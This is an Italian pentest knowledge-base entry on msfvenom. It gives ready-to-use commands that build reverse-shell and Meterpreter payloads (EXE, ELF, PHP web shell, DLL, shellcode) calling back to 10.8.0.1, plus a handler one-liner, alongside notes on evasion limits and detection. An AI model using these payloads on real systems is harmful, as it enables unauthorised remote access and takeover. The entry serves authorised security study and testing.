---
tipo: entita
tag: [tool]
fase: 2
fonti: 2
aggiornato: 2026-06-21
stato: maturo
aliases: ["msfvenom"]
---

# msfvenom

> **Nota etica**: solo lab autorizzati o engagement con permesso scritto.

## In breve
**msfvenom** è il generatore di **payload standalone** di [[Metasploit]] (fusione di `msfpayload` + `msfencode`). Crea l'eseguibile/script/shellcode che, lanciato sul target, apre una [[Reverse Shell e Bind Shell|reverse shell]] o una sessione [[Meterpreter]] verso il tuo handler — utile quando NON usi un exploit del framework ma hai un altro modo di eseguire codice (upload, RCE, macro).

## Anatomia di un comando
```
msfvenom -p <payload> LHOST=<tuo-ip> LPORT=<porta> -f <formato> -o <output>
```
- `-p` payload · `LHOST/LPORT` dove richiamare · `-f` formato d'uscita · `-e` encoder · `-b` bad chars.
- `msfvenom -l payloads` / `-l formats` / `-l encoders` per elencarli.

## Ricette comuni
```bash
# Windows EXE Meterpreter (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.0.1 LPORT=443 -f exe -o shell.exe

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.0.1 LPORT=443 -f elf -o shell

# Web shell PHP (per upload vulnerabili)
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.8.0.1 LPORT=443 -f raw -o shell.php

# DLL / Windows service / ASPX / WAR a seconda del contesto
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=.. LPORT=.. -f dll -o x.dll

# Shellcode C (per exploit dev)
msfvenom -p linux/x64/exec CMD=/bin/sh -f c -b '\x00'
```
Ricevi la sessione con l'handler:
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.8.0.1; set LPORT 443; run"
```

## Encoding ed evasion (limiti)
- `-e x86/shikata_ga_nai -i N` ricodifica N volte: **non** è AV-evasion moderna (le firme di Metasploit sono note). Serve più a rimuovere **bad chars** (`-b '\x00\x0a'`) che a bypassare un EDR.
- Evasion reale = payload custom / framework dedicati, non msfvenom encoder.

## Detection
- Binari generati da msfvenom hanno **firme note** (template `apate`/sezioni tipiche): rilevati da AV/[[EDR e XDR]].
- MITRE: **T1027** (Obfuscated Files), **T1059** (Command/Scripting).

## Collegamenti
- [[Metasploit]] · [[Meterpreter]] — handler e payload
- [[Reverse Shell e Bind Shell]] — alternativa "manuale" senza framework
- [[Vulnerabilita Upload File]] · [[Post-Exploitation]]

## Fonti
- Offensive Security — msfvenom: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
- HackTricks — Shells / msfvenom: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
